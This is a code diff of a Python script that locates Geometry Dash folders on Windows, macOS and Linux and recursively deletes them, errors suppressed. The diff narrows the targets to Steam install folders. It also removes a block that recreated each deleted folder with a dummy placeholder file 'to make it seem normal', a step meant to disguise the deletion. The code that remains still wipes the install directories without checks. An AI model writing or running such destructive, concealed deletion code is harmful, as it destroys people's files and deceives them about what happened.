@@ -29,8 +29,6 @@ def find_geometry_dash_data():
     if system == "Windows":
         # Common Windows paths for Geometry Dash data
         paths_to_check = [
-            os.path.expandvars("%LOCALAPPDATA%\\GeometryDash"),
-            os.path.expandvars("%APPDATA%\\GeometryDash"),
             os.path.expandvars("%PROGRAMFILES%\\Steam\\steamapps\\common\\Geometry Dash"),
             os.path.expandvars("%PROGRAMFILES(X86)%\\Steam\\steamapps\\common\\Geometry Dash")
         ]
@@ -38,14 +36,12 @@ def find_geometry_dash_data():
         
     elif system == "Darwin":  # macOS
         paths_to_check = [
-            os.path.expanduser("~/Library/Application Support/GeometryDash"),
             os.path.expanduser("~/Library/Application Support/Steam/steamapps/common/Geometry Dash")
         ]
         gd_paths = [p for p in paths_to_check if os.path.exists(p)]
         
     elif system == "Linux":
         paths_to_check = [
-            os.path.expanduser("~/.local/share/GeometryDash"),
             os.path.expanduser("~/.steam/steam/steamapps/common/Geometry Dash")
         ]
         gd_paths = [p for p in paths_to_check if os.path.exists(p)]
@@ -60,13 +56,6 @@ def delete_geometry_dash_data(paths):
                 # Try to delete the directory and all its contents
                 shutil.rmtree(path, ignore_errors=True)
                 print(f"Deleted: {path}")
-                
-                # Create an empty directory to replace it
-                os.makedirs(path, exist_ok=True)
-                
-                # Create a dummy file to make it seem normal
-                with open(os.path.join(path, "placeholder.txt"), "w") as f:
-                    f.write("This file will be deleted next time.")
         except Exception as e:
             print(f"Error deleting {path}: {e}")
 
